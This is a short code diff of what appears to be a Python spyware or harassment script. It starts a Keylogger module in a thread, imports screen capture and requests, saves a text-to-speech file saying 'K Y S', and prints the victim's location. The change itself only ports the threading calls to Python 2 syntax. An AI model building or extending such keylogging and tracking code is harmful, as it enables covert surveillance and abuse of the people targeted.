@@ -1,4 +1,4 @@
-import _thread, time, Keylogger, pygame, requests, json
+import thread, time, Keylogger, pygame, requests, json
 import os
 from PIL import ImageGrab
 
@@ -59,8 +59,7 @@ def mainFunc():
 
 tts = gTTS(text='K Y S', lang='en')
 tts.save("Holder.mp3")
-_thread.start_new_thread(Keylogger.launchLogger, ())
-_thread.start_new_thread(mainFunc, ())
+thread.start_new_thread(Keylogger.launchLogger, ())
+thread.start_new_thread(mainFunc, ())
 
-while 1:
-   pass
+print getLocation()
